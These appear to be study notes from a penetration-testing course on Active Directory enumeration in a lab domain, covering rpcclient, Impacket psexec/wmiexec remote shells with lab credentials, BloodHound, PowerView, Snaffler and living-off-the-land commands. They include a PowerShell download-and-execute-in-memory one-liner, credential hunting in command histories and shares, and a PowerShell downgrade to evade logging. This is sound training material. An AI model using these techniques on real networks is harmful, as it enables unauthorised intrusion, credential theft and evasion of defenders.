	> Due to SMB NULL sessions (covered in-depth in the password spraying sections) on some of our hosts, we can perform authenticated or unauthenticated enumeration using rpcclient in the INLANEFREIGHT.LOCAL domain. An example of using rpcclient from an unauthenticated standpoint (if this configuration exists in our target domain) would be:
		rpcclient -U "" -N 172.16.5.5
	> The above will provide us with a bound connection, and we should be greeted with a new prompt to start unleashing the power of rpcclient.

	> From here, we can begin to enumerate any number of different things. Let's start with domain users.
	+ rpcclient Enumeration
		> While looking at users in rpcclient, you may notice a field called rid: beside each user. A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:

    			+ The SID for the INLANEFREIGHT.LOCAL domain is: S-1-5-21-3842939050-3880317879-2865463114.
    			+ When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
    			+ So the domain user htb-student with a RID:[0x457] Hex 0x457 would = decimal 1111, will have a full user SID of: S-1-5-21-3842939050-3880317879-2865463114-1111.
    			+ This is unique to the htb-student object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.

	> However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals 500. The built-in Administrator account will always have the RID value Hex 0x1f4, or 500. This will always be the case. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the htb-student user.
	> RPCClient User Enumeration By RID
		rpcclient $> queryuser 0x457

	> When we searched for information using the queryuser command against the RID 0x457, RPC returned the user information for htb-student as expected. This wasn't hard since we already knew the RID for htb-student. If we wished to enumerate all users to gather the RIDs for more than just one, we would use the enumdomusers command.
	> Enumdomusers
		rpcclient $> enumdomusers

* Impacket Toolkit
	> Impacket is a versatile toolkit that provides us with many different ways to enumerate, interact, and exploit Windows protocols and find the information we need using Python. The tool is actively maintained and has many contributors, especially when new attack techniques arise. We could perform many other actions with Impacket, but we will only highlight a few in this section; wmiexec.py and psexec.py. Earlier in the poisoning section, we grabbed a hash for the user wley with Responder and cracked it to obtain the password transporter@4. We will see in the next section that this user is a local admin on the ACADEMY-EA-FILE host. We will utilize the credentials for the next few actions.
	+ Psexec.py
		> One of the most useful tools in the Impacket suite is psexec.py. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.
		> To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.
			psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  

		! Once we execute the psexec module, it drops us into the system32 directory on the target host. We ran the whoami command to verify, and it confirmed that we landed on the host as SYSTEM. From here, we can perform most any task on this host; anything from further enumeration to persistence and lateral movement. Let's give another Impacket module a try: wmiexec.py.
	+ wmiexec.py
		> Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.
		> Using wmiexec.py
			wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  

text
		> Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation. 

* Windapsearch

	> Windapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory.

	> We have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The --da (enumerate domain admins group members ) option and the -PU ( find privileged users) options. The -PU option is interesting because it will perform a recursive search for users with nested group membership.
	> Windapsearch - Domain Admins
		m1l0js@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
	> To identify more potential users, we can run the tool with the -PU flag and check for users with elevated privileges that may have gone unnoticed. This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.
	> Windapsearch - Privileged Users
		m1l0js@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
		! You'll notice that it performed mutations against common elevated group names in different languages. This output gives an example of the dangers of nested group membership, and this will become more evident when we work with BloodHound graphics to visualize this.

[+] Bloodhound.py

	> Once we have domain credentials, we can run the BloodHound.py(https://github.com/fox-it/BloodHound.py) BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or "attack paths" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses graph theory to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using Cypher language(https://blog.cptjesus.com/posts/introtocypher). The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.
	> It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, ldap3, and dnspython) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from. This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).

	> As we can see the tool accepts various collection methods with the -c or --collectionmethod flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select all to gather as much data as possible. Let's run it this way.
	> Executing BloodHound.py
		m1l0js@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

	> The command above executed Bloodhound.py with the user forend. We specified our nameserver as the Domain Controller with the -ns flag and the domain, INLANEFREIGHt.LOCAL with the -d flag. The -c all flag told the tool to run all checks. Once the script finishes, we will see the output files in the current working directory in the format of <date_object.json>.

	+ Upload the Zip File into the BloodHound GUI
		> We could then type sudo neo4j start to start the neo4j service, firing up the database we'll load the data into and also run Cypher queries against.
		> Next, we can type bloodhound from our Linux attack host when logged in using freerdp to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown, use:
    			user == neo4j / pass == HTB_@cademy_stdnt!.

	> Once all of the above is done, we should have the BloodHound GUI tool loaded with a blank slate. Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as zip -r ilfreight_bh.zip *.json and upload the Zip file. We do this by clicking the Upload Data button on the right side of the window (green arrow). When the file browser window pops up to select a file, choose the zip file (or each JSON file) (red arrow) and hit Open.
	> Now that the data is loaded, we can use the Analysis tab to run queries against the database. These queries can be custom and specific to what you decide using custom Cypher queries. There are many great cheat sheets to help us here. We will discuss custom Cypher queries(https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) more in a later section. As seen below, we can use the built-in Path Finding queries on the Analysis tab on the Left side of the window.
	+ Searching for Relationships
		> The query chosen to produce the map above was Find Shortest Paths To Domain Admins. It will give us any logical paths it finds through users/groups/hosts/ACLs/GPOs, etc., relationships that will likely allow us to escalate to Domain Administrator privileges or equivalent. This will be extremely helpful when planning our next steps for lateral movement through the network. Take some time to experiment with the various features: look at the Database Info tab after uploading data, search for a node such as Domain Users and, scroll through all of the options under the Node Info tab, check out the pre-built queries under the Analysis tab, many which are powerful and can quickly find various ways to domain takeover. Finally, experiment with some custom Cypher queries by selecting some interesting ones from the Cypher cheatsheet linked above, pasting them into the Raw Query box at the bottom, and hitting enter. You can also play with the Settings menu by clicking the gear icon on the right side of the screen and adjusting how nodes and edges are displayed, enable query debug mode, and enable dark mode. Throughout the remainder of this module, we will use BloodHound in various ways, but for a dedicated study on the BloodHound tool, check out the Active Directory BloodHound module.

> In the next section, we will cover running the SharpHound collector from a domain-joined Windows host and work through some examples of working with the data in the BloodHound GUI.

> We experimented with several new tools for domain enumeration from a Linux host. The following section will cover several more tools we can use from a domain-joined Windows host. As a quick note, if you haven't checked out the WADComs(https://wadcoms.github.io/) project yet, you definitely should. It is an interactive cheat sheet for many of the tools we will cover (and more) in this module. It's hugely helpful when you can't remember exact command syntax or are trying out a tool for the first time. Worth bookmarking and even contributing to!


[+] Credentialed Enumeration - from Windows
	> In the previous section, we explored some tools we can use from our Linux attack host for enumeration with valid domain credentials. In this section, we will experiment with a few tools for enumerating from a Windows attack host, such as SharpHound/BloodHound, PowerView/SharpView, Grouper2, Snaffler, and some built-in tools useful for AD enumeration. Some of the data we gather in this phase may provide more information for reporting, not just directly lead to attack paths. Depending on the assessment type, our client may be interested in all possible findings, so even issues like the ability to run BloodHound freely or certain user account attributes may be worth including in our report as either medium-risk findings or a separate appendix section. Not every issue we uncover has to be geared towards forwarding our attacks. Some of the results may be informational in nature but useful to the customer to help improve their security posture.
	> At this point, we are interested in other misconfigurations and permission issues that could lead to lateral and vertical movement. We are also interested in getting a bigger picture of how the domain is set up, i.e., do any trusts exist with other domains both inside and outside the current forest? We're also interested in pillaging file shares that our user has access to, as these often contain sensitive data such as credentials that can be used to further our access.
* TTPs
	- The first tool we will explore is the ActiveDirectory PowerShell module. When landing on a Windows host in the domain, especially one an admin uses, there is a chance you will find valuable tools and scripts on the host.
*.1 ActiveDirectory PowerShell Module(https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
	> The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line. It consists of 147 different cmdlets at the time of writing. We can't cover them all here, but we will look at a few that are particularly useful for enumerating AD environments. Feel free to explore other cmdlets included in the module in the lab built for this section, and see what interesting combinations and output you can create.
	> Before we can utilize the module, we have to make sure it is imported first. The Get-Module cmdlet, which is part of the Microsoft.PowerShell.Core module, will list all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run Import-Module ActiveDirectory to load it for use.
	> Discover Modules
		PS C:\htb> Get-Module
		ModuleType Version    Name                                ExportedCommands
		---------- -------    ----                                ----------------
		Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
		Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...

	> We'll see that the ActiveDirectory module is not yet imported. Let's go ahead and import it.
	> Load ActiveDirectory Module
		PS C:\htb> Import-Module ActiveDirectory
		PS C:\htb> Get-Module
		
		ModuleType Version    Name                                ExportedCommands
		---------- -------    ----                                ----------------
		Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
		Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
		Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...  

	> Now that our modules are loaded, let's begin. First up, we'll enumerate some basic information about the domain with the Get-ADDomain cmdlet.
	> Get Domain Info
		PS C:\htb> Get-ADDomain
	> This will print out helpful information like the domain SID, domain functional level, any child domains, and more. Next, we'll use the Get-ADUser cmdlet. We will be filtering for accounts with the ServicePrincipalName property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack, which we will cover in-depth after the next section.
	> Get-ADUser
		PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
	> Another interesting check we can run utilizing the ActiveDirectory module, would be to verify domain trust relationships using the Get-ADTrust cmdlet
	> Checking For Trust Relationships
		PS C:\htb> Get-ADTrust -Filter *


	> This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. Next, we can gather AD group information using the Get-ADGroup cmdlet.
	> Group Enumeration
		PS C:\htb> Get-ADGroup -Filter * | select name
	> We can take the results and feed interesting names back into the cmdlet to get more detailed information about a particular group like so:
	> Detailed Group Info
		PS C:\htb> Get-ADGroup -Identity "Backup Operators"
	> Now that we know more about the group, let's get a member listing using the Get-ADGroupMember cmdlet.
	> Group Membership
		PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"

	> We can see that one account, backupagent, belongs to this group. It is worth noting this down because if we can take over this service account through some attack, we could use its membership in the Backup Operators group to take over the domain. We can perform this process for the other groups to fully understand the domain membership setup. Try repeating the process with a few different groups. You will see that this process can be tedious, and we will be left with an enormous amount of data to sift through. We must know how to do this with built-in tools such as the ActiveDirectory PowerShell module, but we will see later in this section just how much tools like BloodHound can speed up this process and make our results far more accurate and organized.
	> Utilizing the ActiveDirectory module on a host can be a stealthier way of performing actions than dropping a tool onto a host or loading it into memory and attempting to use it. This way, our actions could potentially blend in more. Next, we will walk through the PowerView tool, which has many features to simplify enumeration and dig deeper into the domain.

* PowerView

	> PowerView(https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment. Much like BloodHound, it provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more. It is a highly versatile tool that can provide us with great insight into the security posture of our client's domain. It requires more manual work to determine misconfigurations and relationships within the domain than BloodHound but, when used right, can help us to identify subtle misconfigurations.

	> Let's examine some of PowerView's capabilities and see what data it returns. The table below describes some of the most useful functions PowerView offers.
	Command 			Description
	Export-PowerViewCSV 		Append results to a CSV file
	ConvertTo-SID 			Convert a User or group name to its SID value
	Get-DomainSPNTicket 		Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
	Domain/LDAP Functions: 	
	Get-Domain 			Will return the AD object for the current (or specified) domain
	Get-DomainController 		Return a list of the Domain Controllers for the specified domain
	Get-DomainUser 			Will return all users or specific user objects in AD
	Get-DomainComputer 		Will return all computers or specific computer objects in AD
	Get-DomainGroup 		Will return all groups or specific group objects in AD
	Get-DomainOU 			Search for all or specific OU objects in AD
	Find-InterestingDomainAcl 	Finds object ACLs in the domain with modification rights set to non-built in objects
	Get-DomainGroupMember 		Will return the members of a specific domain group
	Get-DomainFileServer 		Returns a list of servers likely functioning as file servers
	Get-DomainDFSShare 		Returns a list of all distributed file systems for the current (or specified) domain
	GPO Functions: 	
	Get-DomainGPO 			Will return all GPOs or specific GPO objects in AD
	Get-DomainPolicy 		Returns the default domain policy or the domain controller policy for the current domain
	Computer Enumeration Functions: 	
	Get-NetLocalGroup 		Enumerates local groups on the local or a remote machine
	Get-NetLocalGroupMember 	Enumerates members of a specific local group
	Get-NetShare 			Returns open shares on the local (or a remote) machine
	Get-NetSession 			Will return session information for the local (or a remote) machine
	Test-AdminAccess 		Tests if the current user has administrative access to the local (or a remote) machine
	Threaded 'Meta'-Functions: 	
	Find-DomainUserLocation 	Finds machines where specific users are logged in
	Find-DomainShare 		Finds reachable shares on domain machines
	Find-InterestingDomainShareFile 	Searches for files matching specific criteria on readable shares in the domain
	Find-LocalAdminAccess 		Find machines on the local domain where the current user has local administrator access
	Domain Trust Functions: 	
	Get-DomainTrust 		Returns domain trusts for the current domain or a specified domain
	Get-ForestTrust 		Returns all forest trusts for the current forest or a specified forest
	Get-DomainForeignUser 		Enumerates users who are in groups outside of the user's domain
	Get-DomainForeignGroupMember 	Enumerates groups with users outside of the group's domain and returns each foreign member
	Get-DomainTrustMapping 		Will enumerate all trusts for the current domain and any others seen.

	> This table is not all-encompassing for what PowerView offers, but it includes many of the functions we will use repeatedly. Below we will experiment with a few of them.
	> First up is the Get-DomainUser function. This will provide us with information on all users or specific users we specify. Below we will use it to grab information about a specific user, mmorgan.
	> Domain User Information
		PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol


	> We saw some basic user information with PowerView. Now let's enumerate some domain group information. We can use the Get-DomainGroupMember function to retrieve group-specific information. Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. For example, the output below shows that the Secadmins group is part of the Domain Admins group through nested group membership. In this case, we will be able to view all of the members of that group who inherit Domain Admin rights via their group membership.
	> Recursive Group Membership
		PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

	> Above we performed a recursive look at the Domain Admins group to list its members. Now we know who to target for potential elevation of privileges. Like with the AD PowerShell module, we can also enumerate domain trust mappings.
	> Trust Enumeration
		PS C:\htb> Get-DomainTrustMapping

	> We can use the Test-AdminAccess function to test for local admin access on either the current machine or a remote one.
	> Testing for Local Admin Access
		PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01

		ComputerName    IsAdmin
		------------    -------
		ACADEMY-EA-MS01    True 

	> Above, we determined that the user we are currently using is an administrator on the host ACADEMY-EA-MS01. We can perform the same function for each host to see where we have administrative access. We will see later how well BloodHound performs this type of check. Now we can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.
	> Finding Users With SPN Set
		PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

* SharpView
	> PowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their Empire 4 framework(https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1). Empire 4 is BC-Security's fork of the original Empire project and is actively maintained as of April 2022. We show examples throughout this module using the development version of PowerView because it is an excellent tool for recon in an Active Directory environment, and is still extremely powerful and helpful in modern AD networks even though the original version is not maintained. The BC-SECURITY version of PowerView has some new functions such as Get-NetGmsa(https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), used to hunt for Group Managed Service Accounts, which is out of scope for this module. It is worth playing around with both versions to see the subtle differences between the old and currently maintained versions.

	> Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView. We can type a method name with -Help to get an argument list.
	> Finding Users With SPN Set

		PS C:\htb> .\SharpView.exe Get-DomainUser -Help

		Get_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> -MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> -AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> -KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> -Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> -SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> -Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> -UACFilter <UACEnum> 

	> Here we can use SharpView to enumerate information about a specific user, such as the user forend, which we control.
	> Finding Users With SPN Set
		PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
	> Experiment with SharpView on the MS01 host and recreate as many PowerView examples as possible. Though evasion is not in scope for this module, SharpView can be useful when a client has hardened against PowerShell usage or we need to avoid using PowerShell.



* Shares
	> Shares allow users on a domain to quickly access information relevant to their daily roles and share content with their organization. When set up correctly, domain shares will require a user to be domain joined and required to authenticate when accessing the system. Permissions will also be in place to ensure users can only access and see what is necessary for their daily role. Overly permissive shares can potentially cause accidental disclosure of sensitive information, especially those containing medical, legal, personnel, HR, data, etc. In an attack, gaining control over a standard domain user who can access shares such as the IT/infrastructure shares could lead to the disclosure of sensitive data such as configuration files or authentication files like SSH keys or passwords stored insecurely. We want to identify any issues like these to ensure the customer is not exposing any data to users who do not need to access it for their daily jobs and that they are meeting any legal/regulatory requirements they are subject to (HIPAA, PCI, etc.). We can use PowerView to hunt for shares and then help us dig through them or use various manual commands to hunt for common strings such as files with pass in the name. This can be a tedious process, and we may miss things, especially in large environments. Now, let's take some time to explore the tool Snaffler and see how it can aid us in identifying these issues more accurately and efficiently.

* Snaffler(https://github.com/SnaffCon/Snaffler)

	> Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.
	> To execute Snaffler, we can use the command below:
	> Snaffler Execution
		Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

	> The -s tells it to print results to the console for us, the -d specifies the domain to search within, and the -o tells Snaffler to write results to a logfile. The -v option is the verbosity level. Typically data is best as it only displays results to the screen, so it's easier to begin looking through the tool runs. Snaffler can produce a considerable amount of data, so we should typically output to file and let it run and then come back to it later. It can also be helpful to provide Snaffler raw output to clients as supplemental data during a penetration test as it can help them zero in on high-value shares that should be locked down first.
	> Snaffler in Action
		PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

	> We may find passwords, SSH keys, configuration files, or other data that can be used to further our access. Snaffler color codes the output for us and provides us with a rundown of the file types found in the shares.
	> Now that we have a wealth of data about the INLANEFREIGHT.LOCAL domain (and hopefully clear notes and log file output!), we need a way to correlate it and visualize it. Let's dive deeper into BloodHound and see how powerful this tool can be during any AD-focused security assessment.

* BloodHound
	> As discussed in the previous section, Bloodhound is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects. Both penetration testers and blue teamers can benefit from learning to use BloodHound to visualize relationships in the domain. When used correctly and coupled with custom Cipher queries, BloodHound may find high-impact, but difficult to discover, flaws that have been present in the domain for years.
	> First, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host. There are many ways to achieve this covered in the File Transfer module. For our purposes, we will work with SharpHound.exe already on the attack host, but it's worth experimenting with transferring the tool to the attack host from Pwnbox or our own VM using methods such as a Python HTTP server, smbserver.py from Impacket, etc.
	> We'll start by running the SharpHound.exe collector from the MS01 attack host.
		PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
	> Next, we can exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI tool on MS01. We can do this on MS01 by typing bloodhound into a CMD or PowerShell console. The credentials should be saved, but enter neo4j: HTB_@cademy_stdnt! if a prompt appears. Next, click on the Upload Data button on the right-hand side, select the newly generated zip file, and click Open. An Upload Progress window will pop up. Once all .json files show 100% complete, click the X at the top of that window.
	> We can start by typing domain: in the search bar on the top left and choosing INLANEFREIGHT.LOCAL from the results. Take a moment to browse the node info tab. As we can see, this would be a rather large company with over 550 hosts to target and trusts with two other domains.
	> Now, let's check out a few pre-built queries in the Analysis tab. The query Find Computers with Unsupported Operating Systems is great for finding outdated and unsupported operating systems running legacy software. These systems are relatively common to find within enterprise networks (especially older environments), as they often run some product that cannot be updated or replaced as of yet. Keeping these hosts around may save money, but they also can add unnecessary vulnerabilities to the network. Older hosts may be susceptible to older remote code execution vulnerabilities like MS08-067. If we come across these older hosts during an assessment, we should be careful before attacking them (or even check with our client) as they may be fragile and running a critical application or service. We can advise our client to segment these hosts off from the rest of the network as much as possible if they cannot remove them yet, but should also recommend that they start putting together a plan to decommission and replace them.
	> This query shows two hosts, one running Windows 7 and one running Windows Server 2008 (both of which are not "live" in our lab). Sometimes we will see hosts that are no longer powered on but still appear as records in AD. We should always validate whether they are "live" or not before making recommendations in our reports. We may write up a high-risk finding for Legacy Operating Systems or a best practice recommendation for cleaning up old records in AD.
	> We will often see users with local admin rights on their host (perhaps temporarily to install a piece of software, and the rights were never removed), or they occupy a high enough role in the organization to demand these rights (whether they require them or not). Other times we'll see excessive local admin rights handed out across the organization, such as multiple groups in the IT department with local admin over groups of servers or even the entire Domain Users group with local admin over one or more hosts. This can benefit us if we take over a user account with these rights over one or more machines. We can run the query Find Computers where Domain Users are Local Admin to quickly see if there are any hosts where all users have local admin rights. If this is the case, then any account we control can typically be used to access the host(s) in question, and we may be able to retrieve credentials from memory or find other sensitive data.
	> This is just a snapshot of the useful queries we can run. As we continue through this module, you will see several more that can be helpful in finding other weaknesses in the domain. For a more in-depth study on BloodHound, check out the module Active Directory Bloodhound. Take some time and try out each of the queries in the Analysis tab to become more familiar with the tool. It's also worth experimenting with custom Cypher queries by pasting them into the Raw Query box at the bottom of the screen.
	> Keep in mind as we go through the engagement, we should be documenting every file that is transferred to and from hosts in the domain and where they were placed on disk. This is good practice if we have to deconflict our actions with the customer. Also, depending on the scope of the engagement, you want to ensure you cover your tracks and clean up anything you put in the environment at the conclusion of the engagement.

* We have a great picture of the domain's layout, strengths, and weaknesses. We have credentials for several users and have enumerated a wealth of information such as users, groups, computers, GPOs, ACLs, local admin rights, access rights (RDP, WinRM, etc.), accounts configured with Service Principal Names (SPNs), and more. We have detailed notes and a wealth of output and experimented with many different tools to practice enumerating AD with and without credentials from Linux and Windows attack hosts. What happens if we are restricted with the shell we have or do not have the ability to import tools? Our client may ask us to perform all work from a managed host inside their network without internet access and no way to load our tools. We could land on a host as SYSTEM after a successful attack, but be in a position where it is very difficult or not possible to load tools. What do we do then? In the next section, we will look at how to perform actions while "Living Off The Land."

[+] Living off the land 
* Earlier in the module, we practiced several tools and techniques (both credentialed and uncredentialed) to enumerate the AD environment. These methods required us to upload or pull the tool onto the foothold host or have an attack host inside the environment. This section will discuss several techniques for utilizing native Windows tools to perform our enumeration and then practice them from our Windows attack host.
* Scenario

	> Let's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed. Our client wants to see what types of enumeration are possible, so we'll have to resort to "living off the land" or only using tools and commands native to Windows/Active Directory. This can also be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network in previous sections. Most enterprise environments nowadays have some form of network monitoring and logging, including IDS/IPS, firewalls, and passive sensors and tools on top of their host-based defenses such as Windows Defender or enterprise EDR. Depending on the environment, they may also have tools that take a baseline of "normal" network traffic and look for anomalies. Because of this, our chances of getting caught go up exponentially when we start pulling tools into the environment from outside.
	> Env Commands For Host & Network Recon
	> First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.
	> Basic Enumeration Commands
	Command 						Result
	hostname 						Prints the PC's Name
	[System.Environment]::OSVersion.Version 		Prints out the OS version and revision level
	wmic qfe get Caption,Description,HotFixID,InstalledOn 	Prints the patches and hotfixes applied to the host
	ipconfig /all 						Prints out network adapter state and configurations
	set %USERDOMAIN% 					Displays the domain name to which the host belongs (ran from CMD-prompt)
	set %logonserver% 					Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)

	> The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command systeminfo. The systeminfo command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.

* Harnessing PowerShell

	> PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.
	> Let's look at a few of the ways PowerShell can help us.
		- Cmd-Let 	Description
		> Get-Module 	Lists available modules loaded for use.
		> Get-ExecutionPolicy -List 	Will print the execution policy settings for each scope on a host.
		> Set-ExecutionPolicy Bypass -Scope Process 	This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
		- Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
		- Get-ChildItem Env: | ft Key,Value 	Return environment values such as key paths, users, computer information, etc.
		- powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" 	This is a quick and easy way to download a file from the web using PowerShell and call it from memory.


* We have performed basic enumeration of the host. Now, let's discuss a few operational security tactics.
	> Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.
	> Downgrade Powershell
		PS C:\htb> Get-host
		PS C:\htb> powershell.exe -version 2
		PS C:\htb> Get-host
		PS C:\htb> get-module

